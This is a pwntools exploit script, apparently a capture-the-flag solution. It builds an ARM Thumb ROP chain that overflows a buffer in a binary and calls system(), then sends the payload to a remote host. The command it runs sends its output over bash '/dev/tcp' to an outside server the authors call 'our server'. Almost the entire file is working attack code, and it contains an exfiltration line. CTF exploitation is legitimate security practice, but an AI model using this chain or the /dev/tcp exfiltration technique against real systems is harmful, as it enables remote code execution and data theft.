#!/usr/bin/env python3
from pwn import *

context.binary = "./main_fixed"

# rops
rop_mov_r0_r6_t_adr = 0x00010d2c  # ; mov r0,r6 / pop {r4, r5, r6, pc}
rop_add_r0_r4_t_adr = 0x0001fd74  # ; add r0, r4 / pop {r4, pc}

rop_pop_lr_t_adr = 0x00045f5a  # ; pop.w {r4, lr} / nop.w / pop {r4, pc}

rop_ror_r0_t_adr = 0x0001db28  # ; rors r0, r6 / bx r3
rop_mov_r1_r0_t_adr = 0x0001eb0e  # ; movs r1, r0 / bx lr
rop_add_r1_r3_b_t_adr = 0x0003de3e  # add r1, r3 / blx r1
rop_set_r3_t_adr = 0x00014c28  # ; pop {r3, pc}

rop_system_t_adr = 0x00014c10  # system
rop_exit_t_adr = 0x00014358  # exit fkt

location_bin_sh = 0x0004b004  # string "/bin/sh"
location_date = 0x0004ab60  # string "date +'%s'"

def build_add_r0_r4_t(r4=0):
    payload = p32(rop_add_r0_r4_t_adr + 1)
    payload += p32(r4)
    return payload

def build_lr(lr, r4=0):
    payload = p32(rop_pop_lr_t_adr + 1)
    payload += p32(0) + p32(lr) + p32(r4)
    return payload

def build_mov_r0_r6_t(r4=0, r5=0, r6=0):
    payload = p32(rop_mov_r0_r6_t_adr + 1)
    payload += p32(r4) + p32(r5) + p32(r6)
    return payload


# config of command
addr, port = ("128.140.44.15", 8337)  # our server
cmd = "ls /home/ctf"
cmd_net_wrap = f"bash -c \"{cmd} >/dev/tcp/{addr}/{port}\""
print("cmd:", cmd_net_wrap)
cmd_net_wrap = cmd_net_wrap.encode("ascii")

# build payload
# all instructinos here have a +1 as that indicates thumb mode for
# arm. It does seem that switching to thumb requires special instructions,
# but switching out of it is possible with write to $pc
def build_payload():
    # padding until pc
    payload = b"0" * 0x20
    payload += b"1" * 4  # r7

    # move r6 to r0 and set r4 with r6
    #  - r6 contains a reachable offset on the stack from our $sp
    #  - r6 is used for right shift
    #  - r4 is an arbitrary offset to allow more rop stack until our "data" section
    payload += build_mov_r0_r6_t(r4=40, r6=8)
    # move our "data" section by r4 steps on the stack
    payload += build_add_r0_r4_t()


    # this is so cursed, the idea is to have the application fail with
    # a signal (e.g. illegial instruction) when the system call didn't exit with
    # a zero return code. In case system was successful we shutdown gracefully.

    # as system is stack canary protected, we can't call into it.
    # As such we need to conform to arm calling convetion and set the lr register appropriately
    payload += build_lr(rop_set_r3_t_adr + 1)
    # input of system() is the command. See below
    payload += p32(rop_system_t_adr + 1)

    payload += p32(rop_set_r3_t_adr + 1)
    payload += p32(rop_ror_r0_t_adr + 1)
    payload += p32(rop_exit_t_adr + 1)
    payload += p32(rop_pop_lr_t_adr + 1)
    payload += p32(0) + p32(rop_add_r1_r3_b_t_adr + 1) + p32(0)
    payload += p32(rop_mov_r1_r0_t_adr + 1)

    # Order of execution
    # 1. rop_system_t_adr
    # 2. rop_set_r3_t_adr
    #   - set r3 to rop_set_r3_t_adr
    # 3. rop_ror_r0_t_adr
    #   - r0 >> 8
    #   - jmp to r3
    # 3. rop_set_r3_t_adr
    #   - set r3 to rop_exit_t_adr  (graceful shutdown)
    # 4. rop_pop_lr_t_adr
    #   - set lr register to rop_add_r1_r3_b_t_adr
    # 5. rop_mov_r1_r0_t_adr
    #   - set r1 to r0[our exit code]
    # 6. rop_add_r1_r3_b_t_adr
    #   - add r1 to r3
    #   - jump to r3
    #       -> if r0 = 0: r3 = rop_exit_t_adr
    #       -> if r0 != 0: r3 will be bricked
    #
    # this is ofc not a perfect solution, but it works for most errors

    print(len(payload))  # just a small bounds check

    # fill the remaining space so that our command is put into it correctly
    payload += b"0" * ((40 + 40) - (len(payload) - 0x20))
    payload += cmd_net_wrap + b"\x00"  # command as null terminated string

    print(f"Payload Length: {len(payload)}")
    # our rop stack cannot be to large, as we will overwrite important
    # data that is needed for system call (i.e. dump of env variables).
    # The address is 340 bytes from our initial $sp
    assert(len(payload) < 340)
    return payload

payload = build_payload()

with open("/local-tmp/payload", "bw") as fp:
    fp.write(payload)

if True:
    r = remote("34.125.56.151", 2222, ssl=False)
    r.sendline(payload)
    r.interactive()
    exit()

#io = gdb.debug(context.binary.path, gdbscript="""
#source /home/elizabeth/Documents/Projects/ccc/ctfriday-bsidesindore23/pwndbg/gdbinit.py
#b *0x00021dac
#b *0x010488
#b *0x00014c10
#c
#""")
io = process(context.binary.path)
io.sendline(payload)
io.interactive()
